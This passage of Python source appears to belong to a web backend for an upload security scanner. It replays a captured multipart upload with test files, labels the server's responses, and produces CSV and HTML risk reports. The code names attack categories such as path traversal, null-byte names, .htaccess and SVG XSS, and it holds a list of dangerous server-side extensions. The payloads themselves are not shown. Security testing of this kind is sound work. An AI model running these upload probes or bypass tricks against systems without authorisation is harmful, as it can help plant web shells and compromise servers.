            "disk_file": disk,
            "send_as": tf["send_filename"],
            "logical_name": tf["filename"],
            "category": tf["category"],
            "content_type": tf["content_type"],
            "size": len(tf["content"]),
            "description": tf["description"],
        })

    man_path = os.path.join(out_dir, "MANIFEST.csv")
    with open(man_path, "w", newline="", encoding="utf-8") as f:
        wri = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        wri.writeheader()
        wri.writerows(rows)

    readme = os.path.join(out_dir, "README.txt")
    with open(readme, "w", encoding="utf-8") as f:
        f.write(
            "API Sentinel — File Upload manual test pack\n"
            f"Profile: {profile}\n"
            f"Files: {len(rows)}\n\n"
            "How to use:\n"
            "1. Open MANIFEST.csv — column send_as = exact filename to use in multipart.\n"
            "2. disk_file = the file on disk (safe name if send_as has ../ or %00).\n"
            "3. Upload with Content-Type from content_type column.\n"
            "4. For path-traversal / null-byte rows, rename or set filename= to send_as\n"
            "   in Burp/Postman (disk name is only for storage).\n"
        )
    return {"out_dir": out_dir, "count": len(rows), "manifest": man_path,
            "profile": profile}


# ═══════════════════════════════ TEST RUNNER ═══════════════════════════════ #

DANGEROUS_EXTS = {".php",".php3",".php5",".php7",".phtml",".phar",".asp",".aspx",
                  ".jsp",".jspx",".htaccess",".l33t",".sh",".exe",".cgi"}

_STRIP_HEADERS = {
    "content-type", "content-length", "transfer-encoding",
    "host", "connection", "keep-alive", "proxy-connection",
    "accept-encoding", "expect",
}


def _sync_file_meta(value, old_name, new_name, new_mime):
    """Keep JSON/form meta in sync with the file we actually send (name + content type)."""
    if not value:
        return value
    value = re.sub(r'[\r\n]+-{2,}[^\r\n]*$', '', value).rstrip('\r\n')
    if new_name:
        if old_name and old_name in value:
            value = value.replace(old_name, new_name)
        else:
            value = re.sub(r'("file[Nn]ame"\s*:\s*")[^"]*(")',
                           rf'\g<1>{new_name}\2', value, flags=re.IGNORECASE)
            value = re.sub(r'("original[Nn]ame"\s*:\s*")[^"]*(")',
                           rf'\g<1>{new_name}\2', value, flags=re.IGNORECASE)
            value = re.sub(r'(filename=)[^\s&,}\]]+',
                           rf'\g<1>{new_name}', value, flags=re.IGNORECASE)
        # bare extension swap in quoted names: "report.xlsx" → "valid.jpg"
        if old_name:
            old_ext = os.path.splitext(old_name)[-1]
            new_ext = os.path.splitext(new_name)[-1]
            if old_ext and new_ext and old_ext.lower() != new_ext.lower():
                value = re.sub(
                    re.escape(old_ext) + r'(?=["\s&,}\]])',
                    new_ext, value, flags=re.IGNORECASE, count=2,
                )
    if new_mime:
        for key in ("contentType", "content_type", "mimeType", "mime_type",
                    "fileType", "file_type", "type"):
            value = re.sub(
                rf'("{key}"\s*:\s*")[^"]*(")',
                rf'\g<1>{new_mime}\2', value, flags=re.IGNORECASE,
            )
        value = re.sub(r'(content[_-]?type=)[^&\s]+',
                       rf'\g<1>{new_mime}', value, flags=re.IGNORECASE)
    return value


def _benign_companion(field: dict):
    """Synthetic harmless content for secondary file fields (curl has no bytes)."""
    name = field.get("orig_name") or f"{field.get('key', 'file')}.bin"
    mime = (field.get("mime") or "application/octet-stream").lower()
    ext  = os.path.splitext(name)[-1].lower()
    if ext == ".csv" or mime == "text/csv":
        return name, b"a,b\n1,2\n", "text/csv"
    if ext in _EXCEL_EXTS or any(h in mime for h in _PROFILE_MIME["excel"]):
        if ext == ".xls":
            return name, XLS_OLE_STUB, XLS_MIME
        return name, VALID_XLSX, XLSX_MIME
    if ext in _DOCX_EXTS or any(h in mime for h in _PROFILE_MIME["docx"]):
        return name, VALID_DOCX, DOCX_MIME
    if ext in _PPTX_EXTS or any(h in mime for h in _PROFILE_MIME["pptx"]):
        return name, VALID_PPTX, PPTX_MIME
    if ext in _ZIP_EXTS or any(h in mime for h in _PROFILE_MIME["zip"]):
        return name, VALID_ZIP, ZIP_MIME
    if ext in _PDF_EXTS or "pdf" in mime:
        return name, PDF, "application/pdf"
    if ext == ".png" or mime == "image/png":
        return name, PNG, "image/png"
    if ext == ".gif" or mime == "image/gif":
        return name, GIF, "image/gif"
    if ext == ".svg" or "svg" in mime:
        return name, b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>', "image/svg+xml"
    if ext in _IMAGE_EXTS or mime.startswith("image/"):
        return name, JPEG, mime if mime.startswith("image/") else "image/jpeg"
    if ext in (".txt", ".log") or mime.startswith("text/"):
        return name, b"companion-ok\n", mime if mime.startswith("text/") else "text/plain"
    return name, b"companion-placeholder\n", field.get("mime") or "application/octet-stream"


def do_upload(url, headers, cookies, form_fields, file_param, tf, method="POST"):
    """Replay the upload with one malicious test file via requests multipart.

    Primary file_param gets the probe payload. Any other file fields are kept
    with benign companion content so multi-file APIs are not missing parts.
    """
    send_name = tf.get("send_filename") or tf["filename"]
    orig_name = next((f.get("orig_name", "") or "" for f in form_fields
                      if f.get("is_file") and f.get("key") == file_param), "")
    send_ext  = os.path.splitext(send_name)[-1].lower()
    # Dangerous server-side exts keep original name wrapper when useful for bypass
    # chains; for excel/image content probes always send the test filename.
    wrapper   = orig_name if send_ext in DANGEROUS_EXTS else send_name
    new_mime  = tf.get("content_type") or ""

    # Use list-of-tuples so duplicate field names / multi-file forms work
    mp_files, mp_data = [], {}
    for field in form_fields:
        k = field["key"]
        if field.get("is_file"):
            if k == file_param:
                mp_files.append((k, (send_name, tf["content"], new_mime)))
            else:
                cname, cbody, cmime = _benign_companion(field)
                mp_files.append((k, (cname, cbody, cmime)))
        else:
            raw = re.sub(r'[\r\n]+-{2,}[^\r\n]*$', '', field.get("value") or "").rstrip('\r\n')
            synced = _sync_file_meta(raw, orig_name, wrapper, new_mime)
            f_mime = field.get("mime")
            is_json_field = field.get("is_json") or False
            if not is_json_field and not f_mime:
                try:
                    p = json.loads(synced)
                    if isinstance(p, (dict, list)):
                        is_json_field = True
                except Exception:
                    pass

            if is_json_field or (f_mime and "json" in f_mime.lower()):
                mp_files.append((k, (None, synced, f_mime or "application/json")))
            elif f_mime:
                mp_files.append((k, (None, synced, f_mime)))
            else:
                mp_data[k] = synced

    # requests sets multipart Content-Type+boundary itself
    hdrs = {k: v for k, v in headers.items()
            if k.lower().strip() not in _STRIP_HEADERS and not k.startswith(":")}
    # fresh requestid (gateways reject stale repeats)
    for hk in list(hdrs.keys()):
        if hk.lower() == "requestid":
            hdrs[hk] = str(int(time.time() * 1000)) + str(uuid.uuid4().int % 10000)
            break

    try:
        t0 = time.time()
        req_method = (method or "POST").upper()
        r = req_lib.request(req_method, url, headers=hdrs, cookies=cookies, files=mp_files,
                            data=mp_data, timeout=TIMEOUT, verify=VERIFY_SSL)
        return {"status": r.status_code, "response": r.text[:MAX_RESP],
                "response_len": len(r.text), "elapsed": round(time.time() - t0, 2),
                "resp_headers": dict(r.headers)}
    except Exception as e:
        return {"status": "ERROR", "response": str(e), "response_len": 0,
                "elapsed": 0, "resp_headers": {}}


def verdict(status, body):
    body = (body or "").lower()
    # Content validators that throw → HTTP 500 still mean "rejected this file"
    content_reject = [
        "not a valid ooxml", "no valid entries or contents", "not a valid excel",
        "not a valid spreadsheet", "not a valid word", "not a valid document",
        "not a valid zip", "zip exception", "ziperror", "unsupported media",
        "unsupported file", "invalid file type", "invalid file format",
        "could not parse", "unable to parse", "corrupt", "malformed",
        "does not have any content type", "package require content types",
    ]
    if isinstance(status, int) and 200 <= status < 300:
        bad = ["invalid", "not allowed", "rejected", "unsupported", "forbidden", "blocked",
               "error", "fail", "invalid type", "only", "must be", "cannot upload",
               "not permitted", "illegal", "wrong type", "extension not", "bad request"]
        return "REJECTED_200" if any(b in body for b in bad) else "ACCEPTED"
    if status in (400, 415, 422): return "REJECTED"
    if status in (401, 403):      return "AUTH_ERROR"
    if isinstance(status, int) and status >= 500:
        if any(b in body for b in content_reject):
            return "REJECTED"   # server crashed on bad content = effective block
        return "SERVER_ERROR"
    return "REJECTED"


RISK_MAP = {
    "sol1_basic": "CRITICAL", "sol2_mime": "CRITICAL", "sol3_traversal": "CRITICAL",
    "sol4_htaccess": "CRITICAL", "sol5_nullbyte": "CRITICAL", "sol6_exif": "CRITICAL",
    "ext_bypass": "HIGH", "svg_xss": "HIGH", "redirect_content": "HIGH",
    "excel_formula": "HIGH",
    "xss_file": "MEDIUM", "dangerous": "MEDIUM", "archive": "MEDIUM",
    "size_test": "INFO", "baseline": "INFO", "cross_type": "INFO", "wrong_type": "INFO",
}

def risk(cat, v):
    if v != "ACCEPTED":
        return "SAFE"
    return RISK_MAP.get(cat, "INFO")


def _req_preview(url, headers, cookies, form_fields, file_param, tf, method="POST"):
    """Human-readable request summary for the detail panel."""
    send_name = tf.get("send_filename") or tf["filename"]
    req_method = (method or "POST").upper()
    lines = [f"{req_method} {url}"]
    for k, v in headers.items():
        if k.lower() == "content-type":
            continue
        vv = v if len(str(v)) < 120 else str(v)[:117] + "..."
        lines.append(f"{k}: {vv}")
    if cookies:
        lines.append("Cookie: " + "; ".join(f"{k}={v}" for k, v in cookies.items())[:200])
    lines.append("")
    lines.append("--- multipart body ---")
    for f in form_fields:
        if f.get("is_file"):
            if f["key"] == file_param:
                lines.append(f'[file★] {f["key"]}: filename="{send_name}" '
                             f'Content-Type: {tf["content_type"]} ({len(tf["content"])} bytes)')
            else:
                cname, cbody, cmime = _benign_companion(f)
                lines.append(f'[file] {f["key"]}: filename="{cname}" '
                             f'Content-Type: {cmime} ({len(cbody)} bytes) [companion]')
        else:
            val = (f.get("value") or "")[:120]
            lines.append(f'[field] {f["key"]}: {val}')
    return "\n".join(lines)


# ── Scan runner (background thread) ──────────────────────────────────────────

def _run_scan(job_id, curl):
    job = jobs[job_id]
    t0  = time.time()
    try:
        parsed = parse_curl(curl)
        url, headers, cookies, form_fields, file_param = parsed[:5]
        method = parsed[5] if len(parsed) > 5 else "POST"
    except ValueError as e:
        job.update({"status": "error", "error": str(e), "progress": 100,
                    "elapsed": round(time.time() - t0, 1)})
        return

    profile = infer_upload_profile(form_fields, file_param)
    file_fields = [f["key"] for f in form_fields if f.get("is_file")]
    job["target"]      = url
    job["method"]      = method
    job["file_param"]  = file_param
    job["file_fields"] = file_fields
    job["profile"]     = profile

    test_files = make_test_files(profile)
    job["total"] = len(test_files)

    findings, accepted_types = [], []
    ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "INFO": 3, "SAFE": 4}

    for idx, tf in enumerate(test_files):
        if job.get("stopped"):
            break
        res = do_upload(url, headers, cookies, form_fields, file_param, tf, method=method)
        v   = verdict(res["status"], res.get("response", ""))
        rk  = risk(tf["category"], v)
        if v == "ACCEPTED" and tf["category"] == "baseline":
            accepted_types.append(tf["content_type"])

        findings.append({
            "filename"     : tf["filename"],
            "send_filename": tf["send_filename"],
            "category"     : tf["category"],
            "description"  : tf["description"],
            "content_type" : tf["content_type"],
            "size"         : len(tf["content"]),
            "status"       : res["status"],
            "verdict"      : v,
            "risk"         : rk,
            "response"     : res.get("response", ""),
            "response_len" : res.get("response_len", 0),
            "resp_headers" : res.get("resp_headers", {}),
            "elapsed"      : res.get("elapsed", 0),
            "req_preview"  : _req_preview(url, headers, cookies, form_fields, file_param, tf, method=method),
        })

        job["completed"]      = idx + 1
        job["progress"]       = int((idx + 1) / len(test_files) * 100)
        job["elapsed"]        = round(time.time() - t0, 1)
        job["accepted_types"] = sorted(set(accepted_types))
        # live-sort so the worst rises to the top while scanning
        job["findings"]       = sorted(findings, key=lambda r: ORDER.get(r["risk"], 9))
        # chronological live feed (filename → status), last 30 in test order
        job.setdefault("feed", []).append({
            "filename"     : tf["filename"],
            "send_filename": tf["send_filename"],
            "status"       : res["status"],
            "verdict"      : v,
            "risk"         : rk,
            "category"     : tf["category"],
        })
        job["feed"] = job["feed"][-30:]
        time.sleep(DELAY)

    job.update({
        "status"        : "done",
        "findings"      : sorted(findings, key=lambda r: ORDER.get(r["risk"], 9)),
        "accepted_types": sorted(set(accepted_types)),
        "progress"      : 100,
        "elapsed"       : round(time.time() - t0, 1),
    })


# ── API models & routes ───────────────────────────────────────────────────────

class ScanRequest(BaseModel):
    curl: str


@app.get("/")
def root():
    return {"status": "File Upload Tester Backend running", "port": 8776}


@app.post("/upload/parse")
def parse_only(req: ScanRequest):
    """Validate a curl + report the detected file field / form fields (preview)."""
    try:
        parsed = parse_curl(req.curl)
        url, headers, cookies, form_fields, file_param = parsed[:5]
        method = parsed[5] if len(parsed) > 5 else "POST"
    except ValueError as e:
        raise HTTPException(400, str(e))
    profile = infer_upload_profile(form_fields, file_param)
    file_fields = [f["key"] for f in form_fields if f.get("is_file")]
    return {
        "url": url, "method": method, "file_param": file_param, "file_fields": file_fields,
        "profile": profile,
        "fields": [{"key": f["key"], "is_file": f.get("is_file", False),
                    "orig_name": f.get("orig_name"), "mime": f.get("mime")}
                   for f in form_fields],
        "header_count": len(headers),
        "test_count": len(make_test_files(profile)),
    }


@app.post("/upload/scan")
def start_scan(req: ScanRequest):
    if not req_lib:
        raise HTTPException(500, "requests library not available")
    if not req.curl.strip():
        raise HTTPException(400, "Empty curl command")
    # fail fast on obviously bad curl
    try:
        parse_curl(req.curl)
    except ValueError as e:
        raise HTTPException(400, str(e))

    job_id = str(uuid.uuid4())[:8]
    jobs[job_id] = {
        "status": "scanning", "progress": 0, "completed": 0, "total": 0,
        "findings": [], "feed": [], "accepted_types": [], "elapsed": 0,
        "target": "", "file_param": "", "file_fields": [], "profile": "",
    }
    threading.Thread(target=_run_scan, args=(job_id, req.curl), daemon=True).start()
    return {"job_id": job_id}


@app.get("/upload/progress/{job_id}")
def get_progress(job_id: str):
    job = jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    return {
        "status"        : job["status"],
        "progress"      : job["progress"],
        "completed"     : job["completed"],
        "total"         : job["total"],
        "findings"      : job["findings"],
        "feed"          : job.get("feed", []),
        "accepted_types": job.get("accepted_types", []),
        "target"        : job.get("target", ""),
        "file_param"    : job.get("file_param", ""),
        "file_fields"   : job.get("file_fields", []),
        "profile"       : job.get("profile", ""),
        "elapsed"       : job["elapsed"],
        "error"         : job.get("error", ""),
    }


@app.post("/upload/stop/{job_id}")
def stop_scan(job_id: str):
    job = jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    job["stopped"] = True
    return {"ok": True}


@app.get("/upload/csv/{job_id}")
def download_csv(job_id: str):
    job = jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    buf = io.StringIO()
    w = csv.writer(buf, quoting=csv.QUOTE_ALL)
    w.writerow(["#", "Risk", "Verdict", "Category", "Filename", "Sent As",
                "Content-Type", "Status", "Size", "Description", "Response"])
    for i, r in enumerate(job.get("findings", []), 1):
        w.writerow([i, r["risk"], r["verdict"], r["category"], r["filename"],
                    r["send_filename"], r["content_type"], r["status"], r["size"],
                    r["description"], (r["response"] or "")[:500]])
    return {"csv": buf.getvalue(), "filename": f"upload_scan_{job_id}.csv"}


import html as _html

_RC = {"CRITICAL": "#da3633", "HIGH": "#f85149", "MEDIUM": "#d29922",
       "INFO": "#58a6ff", "SAFE": "#3fb950"}
_VC = {"ACCEPTED": "#f85149", "REJECTED_200": "#d29922", "REJECTED": "#3fb950",
       "AUTH_ERROR": "#6e7681", "SERVER_ERROR": "#ffa657"}


@app.get("/upload/html/{job_id}")
def download_html(job_id: str):
    job = jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    findings = job.get("findings", [])
    e = _html.escape
    crit = sum(1 for r in findings if r["risk"] == "CRITICAL")
    high = sum(1 for r in findings if r["risk"] == "HIGH")
    med  = sum(1 for r in findings if r["risk"] == "MEDIUM")
    acc  = sum(1 for r in findings if r["verdict"] == "ACCEPTED")

    rows = ""
    for i, r in enumerate(findings, 1):
        rc = _RC.get(r["risk"], "#8b949e")
        vc = _VC.get(r["verdict"], "#8b949e")
        sent = (f'<br><span style="color:#ffa657;font-size:11px">↳ sends: {e(r["send_filename"])}</span>'
                if r["send_filename"] != r["filename"] else "")
        rows += (
            f'<tr><td style="color:#6e7681">{i}</td>'
            f'<td><span style="background:{rc};color:#fff;padding:2px 8px;border-radius:4px;'
            f'font-size:11px;font-weight:700">{r["risk"]}</span></td>'
            f'<td><code style="color:#79c0ff">{e(r["filename"])}</code>{sent}</td>'
            f'<td style="color:#c9d1d9;font-size:12px">{e(r["description"])}</td>'
            f'<td><code style="color:#6e7681;font-size:11px">{e(r["content_type"])}</code></td>'
            f'<td style="color:#8b949e;font-size:11px">{e(r["category"])}</td>'
            f'<td>{e(str(r["status"]))}</td>'
            f'<td><span style="background:{vc}22;color:{vc};border:1px solid {vc}44;'
            f'padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700">{r["verdict"]}</span></td></tr>')

    at = ", ".join(job.get("accepted_types", [])) or "none detected"
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>File Upload Security Report</title>
<style>
body{{font-family:-apple-system,Segoe UI,sans-serif;background:#0d1117;color:#c9d1d9;padding:28px;margin:0}}
h1{{font-size:24px;margin:0 0 4px;background:linear-gradient(135deg,#1f6feb,#388bfd);
-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.sub{{color:#6e7681;font-size:12px;font-family:monospace;margin-bottom:18px;word-break:break-all}}
.cards{{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap}}
.card{{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:14px 22px;text-align:center;min-width:90px}}
.num{{font-size:24px;font-weight:800}}.lbl{{font-size:11px;color:#6e7681;letter-spacing:.5px}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
th,td{{text-align:left;padding:8px 10px;border-bottom:1px solid #21262d;vertical-align:top}}
th{{color:#6e7681;font-size:11px;text-transform:uppercase}}
.note{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 16px;font-size:12px;margin-bottom:20px}}
</style></head><body>
<h1>📤 File Upload Security Report</h1>
<div class="sub">Target: {e(job.get('target',''))} · File field: {e(job.get('file_param',''))} · {len(findings)} tests · {job.get('elapsed',0)}s</div>
<div class="cards">
<div class="card"><div class="num" style="color:#da3633">{crit}</div><div class="lbl">CRITICAL</div></div>
<div class="card"><div class="num" style="color:#f85149">{high}</div><div class="lbl">HIGH</div></div>
<div class="card"><div class="num" style="color:#d29922">{med}</div><div class="lbl">MEDIUM</div></div>
<div class="card"><div class="num" style="color:#f85149">{acc}</div><div class="lbl">ACCEPTED</div></div>
<div class="card"><div class="num">{len(findings)}</div><div class="lbl">TESTS</div></div>
</div>
<div class="note"><b style="color:#58a6ff">Server accepts (baseline):</b> {e(at)}</div>
<table><thead><tr><th>#</th><th>Risk</th><th>File</th><th>Description</th><th>Content-Type</th>
<th>Category</th><th>Status</th><th>Verdict</th></tr></thead><tbody>{rows}</tbody></table>
</body></html>"""
    return {"html": html, "filename": f"upload_scan_{job_id}.html"}
